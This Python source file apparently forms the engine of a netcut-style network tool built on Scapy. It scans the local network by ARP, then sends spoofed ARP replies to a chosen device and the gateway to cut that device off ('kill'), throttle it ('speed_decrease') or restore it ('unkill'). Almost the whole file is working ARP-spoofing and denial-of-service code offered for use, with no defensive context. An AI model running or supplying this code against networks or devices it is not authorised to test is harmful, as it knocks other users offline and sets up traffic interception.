from scapy.sendrecv import srp
from scapy.layers.l2 import ARP, Ether
from manuf import manuf
from scapy.all import send, get_if_addr, conf
import time
from multiprocessing import Manager


class ScapyOperations:
    def __init__(self):
        manager = Manager()
        self.dead = manager.dict()
        self.speed_of_ips = manager.dict()

    def arp_scan(self, ip):
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        try:
            ans, unans = srp(request, timeout=2, retry=1)
        except ValueError:
            pass
        
        user_ip = get_if_addr(conf.iface)
        scanned_users = {}
        result2 = []
        p = manuf.MacParser(update=True)
        for sent, received in ans:
            scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
            if received.psrc != user_ip:
                temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
                result2.append(temp)

        for received in unans:
            if received.psrc not in scanned_users:
                scanned_users[received.psrc] = {'MAC': received.hwsrc.upper(), 'Vendor': str(p.get_manuf(received.hwsrc))}
                if received.psrc != user_ip:
                    temp = (received.psrc, received.hwsrc.upper(), str(p.get_manuf(received.hwsrc)))
                    result2.append(temp)

        return result2

    def kill(self, source, target_mac, target_ip, wait_after):
        # Spoofing target
        # Cheat target
        to_target = ARP(
            op=1,
            psrc=source[0],
            hwdst=target_mac,
            pdst=target_ip
        )

        # Cheat source
        to_source = ARP(
            op=1,
            psrc=target_ip,
            hwdst=source[1],
            pdst=source[0]
        )

        temp_speed = self.speed_of_ips[target_ip]
        while True:
            if target_ip in self.speed_of_ips:
                if self.speed_of_ips[target_ip] == temp_speed:
                    # Send packets to both target and source
                    send(to_target, verbose=0)
                    send(to_source, verbose=0)
                    time.sleep(wait_after)
                else:
                    break
            else:
                break

    def unkill(self, source, target_mac, target_ip):
        # Unspoofing target
        if target_ip in self.dead:
            self.dead.pop(target_ip)

        # Fix target
        to_target = ARP(
            op=1,
            psrc=source[0],
            hwsrc=source[1],
            pdst=target_ip,
            hwdst=target_mac
        )

        # Fix Router
        to_router = ARP(
            op=1,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=source[0],
            hwdst=source[1]
        )

        # Send packets to both target and router
        send(to_target, verbose=0)
        send(to_router, verbose=0)

    def speed_decrease(self, source, target_mac, target_ip, wait_after):
        temp_speed = self.speed_of_ips[target_ip]
        # Spoofing target
        # Cheat target
        to_target_kill = ARP(
            op=1,
            psrc=source[0],
            hwdst=target_mac,
            pdst=target_ip
        )

        # Cheat source
        to_source_kill = ARP(
            op=1,
            psrc=target_ip,
            hwdst=source[1],
            pdst=source[0]
        )

        # Unspoofing target
        # Fix target
        to_target_unkill = ARP(
            op=1,
            psrc=source[0],
            hwsrc=source[1],
            pdst=target_ip,
            hwdst=target_mac
        )

        # Fix Router
        to_router_unkill = ARP(
            op=1,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=source[0],
            hwdst=source[1]
        )
        while True:
            if target_ip in self.speed_of_ips:
                if self.speed_of_ips[target_ip] == temp_speed:
                    # Send packets to both target and source
                    if self.speed_of_ips[target_ip] == 3:
                        for i in range(wait_after):
                            send(to_target_kill, verbose=0)
                            send(to_source_kill, verbose=0)
                            time.sleep(wait_after)
                    else:
                        send(to_target_kill, verbose=0)
                        send(to_source_kill, verbose=0)
                        time.sleep(wait_after)

                    send(to_target_unkill, verbose=0)
                    send(to_router_unkill, verbose=0)
                    time.sleep(1.5)
                else:
                    break
            else:
                break
